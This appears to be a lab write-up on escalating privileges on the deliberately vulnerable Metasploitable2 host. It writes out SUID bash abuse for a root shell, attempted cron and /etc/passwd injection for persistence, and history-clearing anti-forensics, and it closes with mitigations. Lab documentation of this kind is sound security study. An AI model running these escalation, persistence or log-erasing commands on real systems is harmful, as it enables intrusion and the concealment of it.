Day 18 – Local Privilege Escalation: SUID Abuse & Post-Exploitation Analysis

## Target

- Machine: Metasploitable2
- Initial User: msfadmin
- OS: Linux (intentionally vulnerable)
- Goal: Local Privilege Escalation to root and persistence analysis


##  Initial Enumeration

Confirmed current privileges:

whoami
id

Result:

User: msfadmin

No direct root shell at start

##  SUID Binary Abuse (Successful Vector)

###  Bash Copy & SUID Manipulation

Copied bash to a writable directory:

cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash

Initial execution did not escalate due to ownership:


/tmp/rootbash -p
whoami

Result:

Still msfadmin

###  Ownership Fix via sudo (Critical Step)

Changed ownership to root and reapplied SUID:

sudo chown root:root /tmp/rootbash
sudo chmod u+s /tmp/rootbash

Executed privileged shell:

/tmp/rootbash -p
whoami
id

SUCCESS

Effective UID: root

Full root privileges obtained

##  Verification of Existing System Weakness

Checked original bash binary:

ls -l /bin/bash

Observation:

/bin/bash already had SUID bit set

Confirms system-wide misconfiguration

Explains ease of privilege escalation on this host

##  Failed Privilege Escalation Attempts (Documented)

### Cron Job Injection

Attempt:

echo '* * * * * root /bin/bash -c "chmod u+s /bin/bash"' >> /etc/crontab

Result:

Permission denied

Conclusion:

/etc/crontab properly protected

### /etc/passwd Injection

Attempted password hash injection:

openssl passwd -1 admin123
echo 'sysadmin:<hash>:0:0:System Admin:/root:/bin/bash' >> /etc/passwd

Result:

Permission denied

User not created

### Log Deletion & Anti-Forensics

Successful:

history -c
echo "" > ~/.bash_history

Failed:

rm /var/log/auth.log

Conclusion:

User-level history cleared

System logs protected by root-only permissions

##  Impact Assessment

Vector  Result
SUID abuse  ✅ Successful
Cron injection  ❌ Blocked
passwd injection  ❌ Blocked
Log deletion  ⚠️ Partial

##  Mitigations

Remove SUID from /bin/bash

Audit all SUID binaries:

find / -perm -4000 2>/dev/null

Restrict sudo privileges

Monitor /tmp for executable abuse

##  Conclusion

This lab demonstrated a real-world Local Privilege Escalation scenario via SUID misconfiguration. While several common attack vectors were correctly blocked, the presence of SUID-enabled bash allowed trivial root compromise.

This highlights the importance of strict permission auditing and continuous system hardening.
